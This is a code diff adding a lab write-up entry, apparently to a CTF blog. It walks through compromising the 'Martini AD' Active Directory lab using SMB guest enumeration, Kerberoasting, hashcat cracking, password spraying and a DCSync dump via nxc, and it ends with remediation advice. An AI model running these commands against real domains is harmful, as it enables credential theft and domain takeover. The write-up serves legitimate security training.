@@ -865,6 +865,153 @@ dismay\\administrator
 
 ![Dismay Certificate of Completion](assets/writeups/Dismay/cert.png)
 `
+},
+
+{
+   id: "martini-ad",
+   title: "Martini AD (Hack Smarter Labs)",
+   ctf: "Hack Smarter Labs",
+   cat: "Active Directory",
+   diff: "Medium",
+   pts: 0,
+   date: "2026-10-24",
+   summary: "An internal black-box Active Directory assessment that moves from guest SMB enumeration to domain compromise through exposed notes, Kerberoasting, credential reuse and DCSync.",
+   files: [],
+   body: `![Martini AD preview](assets/writeups/BitStream/image.png)
+
+## Scope / Objective
+
+Martini Bars engaged the Hack Smarter team to perform an internal black-box penetration test at one of its branch offices following a corporate breach. VPN access was provided, but no domain credentials were supplied.
+
+## Nmap Enumeration
+
+The initial scan identified the target at \`10.1.253.173\` and exposed a typical Active Directory service set, including DNS, Kerberos, LDAP, SMB, MSRPC, RDP and WinRM.
+
+\`\`\`bash
+nmap -sCV 10.1.253.173 -vv
+\`\`\`
+
+![Nmap enumeration](assets/writeups/BitStream/image.png)
+
+## SMB Enumeration
+
+I first checked whether SMB permitted null-session access, then tested guest access to enumerate available shares.
+
+\`\`\`bash
+nxc smb 10.1.253.173 -u '' -p '' --shares
+nxc smb 10.1.253.173 -u guest -p '' --shares
+\`\`\`
+
+![SMB null authentication check](assets/writeups/BitStream/image.png)
+
+![SMB share enumeration](assets/writeups/BitStream/image.png)
+
+### Notes Share
+
+The \`Notes\` share was accessible through the guest account. Reviewing its contents exposed a set of credentials that provided the initial foothold.
+
+\`\`\`bash
+smbclient //10.1.253.173/notes -U guest
+\`\`\`
+
+![Notes share contents](assets/writeups/BitStream/image.png)
+
+## Initial Access
+
+The notes contained credentials for the account \`mprice\`. I used them to enumerate domain RIDs and identify additional domain principals.
+
+\`\`\`text
+mprice : [REDACTED]
+\`\`\`
+
+### Username Enumeration
+
+\`\`\`bash
+nxc smb 10.1.253.173 -u m.price -p '[REDACTED]' --rid-brute
+\`\`\`
+
+The enumeration identified the following principals:
+
+- \`mprice\`
+- \`athena.t0\`
+- \`ATHENA_SVC\`
+- \`DC01$\`
+
+![RID brute-force user enumeration](assets/writeups/BitStream/image.png)
+
+## Kerberoasting
+
+I checked for accounts with Service Principal Names (SPNs) and requested the relevant service ticket for offline password auditing.
+
+\`\`\`bash
+impacket-GetUserSPNs DRY.MARTINI.BARS/mprice:'[REDACTED]' -request -dc-ip 10.1.253.173
+\`\`\`
+
+![Kerberoastable account enumeration](assets/writeups/BitStream/image.png)
+
+### Password Cracking
+
+The captured Kerberos service-ticket hash was tested against the RockYou wordlist using Hashcat. The service account password was recovered during the lab.
+
+\`\`\`bash
+hashcat hash.txt /usr/share/wordlists/rockyou.txt
+\`\`\`
+
+\`\`\`text
+ATHENA_SVC : [REDACTED]
+\`\`\`
+
+![Hashcat result](assets/writeups/BitStream/image.png)
+
+## BloodHound Analysis
+
+With the \`ATHENA_SVC\` account compromised, I collected and reviewed Active Directory relationship data to understand the available privilege paths.
+
+\`\`\`bash
+bloodyad --host "10.1.253.173" -d "DRY.MARTINI.BARS" -u ATHENA_SVC -p '[REDACTED]' get bloodhound
+\`\`\`
+
+![BloodHound analysis](assets/writeups/BitStream/image.png)
+
+## Password Reuse
+
+I tested the recovered service-account password against the enumerated domain users. The password was also valid for \`athena.t0\`, demonstrating password reuse between a service account and a user account.
+
+\`\`\`bash
+nxc ldap 10.1.253.173 -u users.txt -p '[REDACTED]' --continue-on-success
+\`\`\`
+
+The account \`athena.t0\` was successfully authenticated.
+
+![LDAP password-spray results](assets/writeups/BitStream/image.png)
+
+## Domain Compromise
+
+With the \`athena.t0\` account compromised, I used the account's privileges to obtain domain credential material through a DCSync operation.
+
+\`\`\`bash
+nxc smb 10.1.253.173 -u athena.t0 -p '[REDACTED]' --ntds
+\`\`\`
+
+![DCSync results](assets/writeups/BitStream/image.png)
+
+## Key Findings
+
+- Guest-accessible SMB shares exposed internal notes containing valid domain credentials.
+- A Kerberoastable service account used a password that could be recovered through offline password auditing.
+- The recovered service-account password was reused by another domain user.
+- The compromised user account had sufficient replication privileges to perform DCSync, resulting in domain credential exposure.
+
+## Security Recommendations
+
+- Disable guest access and anonymous SMB access unless there is a documented business requirement.
+- Review share permissions and remove sensitive operational notes and credentials from shared locations.
+- Use long, unique, randomly generated passwords for service accounts and rotate any credentials exposed during the assessment.
+- Prefer group Managed Service Accounts (gMSAs) where supported and use strong Kerberos encryption settings.
+- Prevent password reuse between service accounts and standard user accounts.
+- Audit and tightly restrict directory replication permissions, including \`DS-Replication-Get-Changes\` and \`DS-Replication-Get-Changes-All\`.
+- Monitor for unusual directory replication activity and review privileged account membership regularly.
+`
 }
 
 ];
